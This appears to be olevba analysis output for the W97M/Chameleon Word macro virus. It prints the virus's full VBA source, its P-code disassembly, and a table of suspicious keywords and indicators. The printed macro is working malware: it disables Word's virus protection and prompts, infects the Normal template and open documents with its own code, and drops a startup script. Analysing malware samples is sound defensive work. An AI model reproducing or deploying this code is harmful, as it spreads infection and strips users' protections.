olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chameleon
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chameleon - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        Randomize
        Call VScript
        Dim x, rn
        Options.VirusProtection = (Rnd * 0)
        Options.SaveNormalPrompt = (Rnd * 0)
        Options.ConfirmConversions = (Rnd * 0)
        Options.SavePropertiesPrompt = (Rnd * 0)
        Application.EnableCancelKey = wdCancelDisabled: Application.DisplayAlerts = (Rnd * 0)
        Set n = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
        Set a = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
        Set td = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
        Open "C:\Windows\System\Chameleon.dll" For Output As #1
            Print #1, td.Lines(1, td.CountOfLines)
        Close #1
        If n.Lines(42, 1) <> "W97M/Chameleon" Then
            n.DeleteLines 1, n.CountOfLines
            n.AddFromFile ("C:\Windows\System\Chameleon.dll")
            n.ReplaceLine 42, "Sub ViewVBCode()"
            For x = 46 To 62 Step 2
                rn = (Rnd * 1000)
                n.ReplaceLine x, "'" & rn & Application.UserName
            Next x
        End If
        If a.Lines(42, 1) <> "W97M/Chameleon" Then
            a.DeleteLines 1, a.CountOfLines
            a.AddFromFile ("C:\Windows\System\Chameleon.dll")
            a.ReplaceLine 45, "Sub ToolsMacro()"
            For x = 46 To 62 Step 2
                rn = (Rnd * 1000)
                a.ReplaceLine x, "'" & rn & Application.ActivePrinter
            Next x
            ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
        End If
        Set n = Nothing
        Set a = Nothing
        Set td = Nothing
        If Day(Now) = 18 Then MsgBox "Let me slip into something" & vbCr & "a little more comfortable... :)", 4096, "W97M/Chameleon"
    End If
' W97M/Chameleon
'   by: Total Konfuzion
End Sub
Sub ToolsMacro()

End Sub

Private Function VScript()

    On Error Resume Next

    Open "C:\Windows\Start Menu\Programs\Startup\Chameleon.vbs" For Output As #1

        Print #1, "' W97M/Chameleon"

        Print #1, "'    by: Total Konfuzion"

        Print #1, "msgbox ""             Greetz from Chameleon   :)             "",4096,""W97M/Chameleon"""

    Close #1

End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Chameleon
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4676 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0003 "MVP"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001A "Enabled by Total Konfuzion"
' 	Ne 
' 	IfBlock 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	ArgsCall (Call) VScript 0x0000 
' Line #5:
' 	Dim 
' 	VarDefn x
' 	VarDefn rn
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #10:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set n 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set a 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set td 
' Line #14:
' 	LitStr 0x001F "C:\Windows\System\Chameleon.dll"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0001 
' 	Ld td 
' 	MemLd CountOfLines 
' 	Ld td 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #17:
' 	LitDI2 0x002A 
' 	LitDI2 0x0001 
' 	Ld n 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "W97M/Chameleon"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld n 
' 	MemLd CountOfLines 
' 	Ld n 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #19:
' 	LitStr 0x001F "C:\Windows\System\Chameleon.dll"
' 	Paren 
' 	Ld n 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #20:
' 	LitDI2 0x002A 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Ld n 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #21:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003E 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #22:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	Paren 
' 	St rn 
' Line #23:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld rn 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld n 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #24:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	LitDI2 0x002A 
' 	LitDI2 0x0001 
' 	Ld a 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "W97M/Chameleon"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd CountOfLines 
' 	Ld a 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #28:
' 	LitStr 0x001F "C:\Windows\System\Chameleon.dll"
' 	Paren 
' 	Ld a 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #29:
' 	LitDI2 0x002D 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld a 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #30:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003E 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #31:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	Paren 
' 	St rn 
' Line #32:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld rn 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld a 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	SetStmt 
' 	LitNothing 
' 	Set n 
' Line #37:
' 	SetStmt 
' 	LitNothing 
' 	Set a 
' Line #38:
' 	SetStmt 
' 	LitNothing 
' 	Set td 
' Line #39:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001A "Let me slip into something"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001F "a little more comfortable... :)"
' 	Concat 
' 	LitDI2 0x1000 
' 	LitStr 0x000E "W97M/Chameleon"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	QuoteRem 0x0000 0x000F " W97M/Chameleon"
' Line #42:
' 	QuoteRem 0x0000 0x0016 "   by: Total Konfuzion"
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Private Function VScript(id_FFFE As Variant))
' Line #49:
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' Line #52:
' 	LitStr 0x0034 "C:\Windows\Start Menu\Programs\Startup\Chameleon.vbs"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #53:
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "' W97M/Chameleon"
' 	PrintItemNL 
' Line #55:
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "'    by: Total Konfuzion"
' 	PrintItemNL 
' Line #57:
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0053 "msgbox "             Greetz from Chameleon   :)             ",4096,"W97M/Chameleon""
' 	PrintItemNL 
' Line #59:
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #61:
' Line #62:
' 	EndFunc 
' Line #63:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Chameleon.dll       |Executable file name                         |
|IOC       |Chameleon.vbs       |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

